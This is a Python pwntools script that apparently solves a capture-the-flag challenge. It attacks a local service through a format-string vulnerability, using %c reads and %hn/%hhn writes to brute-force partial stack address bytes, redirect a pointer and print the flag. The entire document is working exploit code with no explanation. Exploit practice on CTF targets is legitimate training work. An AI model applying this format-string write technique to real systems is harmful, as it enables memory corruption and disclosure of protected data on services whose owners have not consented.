from pwn import *

r = remote('0.0.0.0', 5001)
bin = ELF('./chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.clear(os='linux', arch='x86_64', log_level='debug')

def debug():
    gdb.attach(r, '''b*main+305''')

def send(format: str):
    r.sendafter(b': ', format)

def guess() -> int:
    global r

    while True:
        try:
            send(b'%23$c')
            last_byte = (r.recvuntil(b'Your')[0] - 0x18) & 0xff
            for i in range(0, 256, 16):
                format = f'%{(i<<8) | last_byte}c%23$hn'.encode()
                print(format)
                send(format)

                format = f'%{0xfe}c%53$hn'.encode()
                send(format)
                
                send(b'%18$c')
                recv = r.recvuntil(b'Your')[0]
                if recv == 0xfe:
                    two_byte = (i << 8) | last_byte
                    return two_byte - 0x40
        except:
            r.close()
            r = remote('0.0.0.0', 5001)

flag_addr = guess()
log.info('Two byte of flag address: %#x' % flag_addr)

send(f'%{flag_addr - 1}c%23$hn'.encode())
send(f'%49c%53$hhn'.encode())
send(b'c'*0xf)
print('Flag: %s' % r.recv()[0x10:].decode())